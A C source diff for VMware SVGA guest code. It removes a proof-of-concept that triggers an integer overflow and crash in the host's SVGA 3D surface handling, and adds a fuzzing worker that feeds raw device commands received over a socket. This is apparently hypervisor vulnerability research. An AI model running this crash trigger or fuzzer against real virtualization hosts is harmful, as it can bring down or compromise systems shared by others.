@@ -1,78 +1,84 @@
 #include <err.h>
 #include <stdlib.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <string.h>
 
 #include "svga.h"
 #include "svga3d_reg.h"
 
+#include "config.h"
+
 SVGADevice gSVGA;
+
+void run_data(uint32_t* data);
 
 int main(int argc, char **argv)
 {
-
-	SVGA3dCmdHeader hdr = {0};
-	SVGA3dCmdDefineSurface surface = {0};
-	SVGA3dSize dsize[2] = {0};
-	SVGA3dCmdDestroySurface destroy_sid = {0};
-
+  if (argc != 3) {
+    err(EXIT_FAILURE, "[*] Usage : ./worker <server port> <port>");
+  }
+  
+  // svga setup
 	if (conf_svga_device() != 0)
 		errx(EXIT_FAILURE, "[!] Error initializing SVGA device");
-
-	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);
 
 	SVGA_WriteReg(SVGA_REG_WIDTH, 0x320);
 	SVGA_WriteReg(SVGA_REG_HEIGHT, 0x258);
 	SVGA_WriteReg(SVGA_REG_BITS_PER_PIXEL, 32);
 
-	hdr.size = 60;
-	surface.sid = 0;
-	surface.surfaceFlags= SVGA3D_SURFACE_CUBEMAP;
-	surface.format = SVGA3D_BUFFER;
-	surface.face[0].numMipLevels = 0x2aaaaaab;
-	surface.face[1].numMipLevels = 0x2aaaaaab;
-	surface.face[2].numMipLevels = 0x2aaaaaab;
-	surface.face[3].numMipLevels = 0x2aaaaaab;
-	surface.face[4].numMipLevels = 0x2aaaaaab;
-	surface.face[5].numMipLevels = 0x2aaaaaab;
+  // fuzz iteration setup
+  int sockfd = -1;
+  char buf[MAX_DATA_SIZE];
+  struct hostent* host = NULL;
+  struct sockaddr_in host_addr = {0};
 
-	dsize[0].width  = 2;
-	dsize[0].height = 2;
-	dsize[0].depth  = 2;
+  if((host=gethostbyname(argv[1])) == NULL)
+    err(EXIT_FAILURE, "[!] Invalid host name : %s", argv[1]);
 
-	dsize[1].width  = 2;
-	dsize[1].height = 2;
-	dsize[1].depth  = 2;
+  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    err(EXIT_FAILURE, "[!] Socket binding failed");
 
-	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE);
-	VMwareWriteWordToFIFO(hdr.size);
-	VMwareWriteWordToFIFO(surface.sid);
-	VMwareWriteWordToFIFO(surface.surfaceFlags);
-	VMwareWriteWordToFIFO(surface.format);
-	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
-	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
-	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
-	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
-	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
-	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);
+  host_addr.sin_family = AF_INET;
+  host_addr.sin_port = htons(atoi(argv[2]));
+  host_addr.sin_addr = *((struct in_addr*)host->h_addr);
+  memset(&(host_addr.sin_zero), 0, 8);
 
-	VMwareWriteWordToFIFO(dsize[0].width);
-	VMwareWriteWordToFIFO(dsize[0].height);
-	VMwareWriteWordToFIFO(dsize[0].depth);
-	VMwareWriteWordToFIFO(dsize[1].width);
-	VMwareWriteWordToFIFO(dsize[1].height);
-	VMwareWriteWordToFIFO(dsize[1].depth);
+  // fuzz iteration
+  while(1) {
+    for(; connect(sockfd, (struct sockaddr*)&host_addr, sizeof(struct sockaddr)) == -1; );
 
-	warnx("[+] Triggering the integer overflow using SVGA_3D_CMD_SURFACE_DEFINE...");
-	VMwareWaitForFB();
-	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);
+    warnx("[+] Connection established");
 
-	hdr.size = 4;
-	destroy_sid.sid = 0;
+    memset(buf, 0, MAX_DATA_SIZE);
+    
+    int numbytes = 0;
+    int bytes_read = -1;
+    while(numbytes < MAX_DATA_SIZE-1 && 
+      (bytes_read=recv(sockfd, buf+numbytes, MAX_DATA_SIZE-numbytes-1, 0)) != -1) {
+      numbytes += bytes_read;
+    }
+    warnx("[+] Received %d bytes", numbytes);
 
-	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DESTROY); 
-	VMwareWriteWordToFIFO(hdr.size);
-	VMwareWriteWordToFIFO(destroy_sid.sid);
-	warnx("[+] Triggering the crash using SVGA_3D_CMD_SURFACE_DESTROY...");
-	VMwareWaitForFB();
-
+    run_data((uint32_t*)buf);
+  }
 	return 0;
+}
+
+void run_data(uint32_t* data) {
+  unsigned idx = 0;
+  while(idx < MAX_DATA_SIZE / 4) {
+    uint32_t cmdnr = data[idx++];
+    uint32_t hdrsize = data[idx++];
+
+	  SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);
+
+    VMwareWriteWordToFIFO(cmdnr);
+    VMwareWriteWordToFIFO(hdrsize);
+    for(int i = 0; i < hdrsize / 4; i++) {
+      VMwareWriteWordToFIFO(data[idx++]);
+    }
+    VMwareWaitForFB();
+  }
 }
